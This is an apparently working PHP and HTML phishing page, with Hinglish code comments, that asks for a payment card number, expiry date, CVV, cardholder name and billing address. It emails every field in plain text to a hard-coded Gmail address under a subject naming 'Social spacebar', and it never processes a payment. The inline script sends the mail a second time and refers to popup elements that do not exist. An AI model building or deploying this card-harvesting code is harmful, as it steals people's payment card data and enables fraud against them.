<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['info_submit'])) {
    // Form fields se data ko collect karo
    $cardNumber = $_POST["card_number"];
    $expDate = $_POST["exp_date"];
    $cvvNumber = $_POST["cvv_number"];
    $holderName = $_POST["holder_name"];
    $billingAddress = $_POST["billing_address"];
    $unit = $_POST["unit"];
    $city = $_POST["city"];
    $state = $_POST["state"];
    $zipCode = $_POST["zip_code"];

    // Email body ko format karo
    $toEmail = "gorodcarlos@gmail.com";
    $subject = "New Card Information Submission From Social spacebar";
    $body = "Card Number: $cardNumber\nExp Date: $expDate\nCVV: $cvvNumber\nCard Holder Name: $holderName\nBilling Address: $billingAddress\nApt/Unit: $unit\nCity: $city\nState: $state\nZip Code: $zipCode";

    // Sender ka email address
    $headers = "From: ali.developer@techability.info";

    // Email ko send karo
    if (mail($toEmail, $subject, $body, $headers)) {
        echo "Email has been sent successfully";
    } else {
        echo "Email sending failed";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sample Form</title>
    <style>
        /* Add your CSS styles here */
    </style>
</head>
<body>

              <!-- HTML form yahan define karo -->
<form class="text_field" method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
    <input type="text" name="card_number" id="" placeholder="Card Number" required>
    <div class="row mr-0">
        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
            <input type="text" name="exp_date" id="" placeholder="Exp Date" required>
        </div>
        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
            <input type="number" name="cvv_number" id="" placeholder="CVV" required>
        </div>
    </div>
    <div class="row mr-0">
        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
            <input type="text" name="holder_name" id="" placeholder="Card Holder Name" required>
        </div>
        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
            <input type="text" name="billing_address" id="" placeholder="Billing Address" required>
        </div>
    </div>
    <div class="row mr-0">
        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
            <input type="number" name="unit" id="" placeholder="Apt/Unit" required>
        </div>
        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
            <input type="text" name="city" id="" placeholder="City" required>
        </div>
    </div>
    <div class="row mr-0">
        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
            <input type="text" name="state" id="" placeholder="State" required>
        </div>
        <div class="col-lg-6 col-md-6 col-sm-12 col-12">
            <input type="text" name="zip_code" id="" placeholder="Zip Code" required>
        </div>
    </div>
     <button class="form_button" type="submit" name="info_submit">Submit</button>
</form>


<script>
    // Function to display popup
    function displayPopup(popupId) {
        var popup = document.getElementById(popupId);
        popup.style.display = "block";
        setTimeout(function() {
            popup.style.display = "none";
        }, 3000); // Hide after 3 seconds
    }

    // Check if form is submitted successfully or not
    <?php if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['info_submit'])) { ?>
        <?php if (mail($toEmail, $subject, $body, $headers)) { ?>
            displayPopup('popupSuccess');
        <?php } else { ?>
            displayPopup('popupError');
        <?php } ?>
    <?php } ?>
</script>

</body>
</html>
